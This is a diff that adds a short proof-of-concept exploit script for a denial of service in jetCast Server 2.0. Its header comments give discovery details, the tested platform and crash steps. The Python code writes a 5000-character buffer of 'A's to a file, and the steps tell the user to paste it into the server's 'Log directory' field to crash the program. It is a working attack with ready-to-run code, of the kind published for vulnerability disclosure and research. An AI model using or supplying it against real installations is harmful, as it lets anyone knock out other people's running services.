@@ -1,0 +1,22 @@
+#Exploit Title:  jetCast Server 2.0 - Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-05-09
+#Vendor Homepage: http://www.jetaudio.com/
+#Software Link: http://www.jetaudio.com/download/5fc01426-741d-41b8-a120-d890330ec672/jetAudio/Download/jetCast/build/JCS2000.exe
+#Tested Version: 2.0
+#Tested on: Windows 7 Service Pack 1 x64 
+
+#Steps to produce the crash:
+#1.- Run python code: jetCast_Server_2.0.py
+#2.- Open jetCast.txt and copy content to clipboard
+#2.- Open jetCast Server 
+#3.- Select Config 
+#4.- In "Log directory" Paste ClipBoard 
+#5.- Click on "Ok"
+#6.- Click on "Start"
+#7.- Crashed
+
+cod = "\x41" * 5000
+f = open('jetCast.txt', 'w')
+f.write(cod)
+f.close()
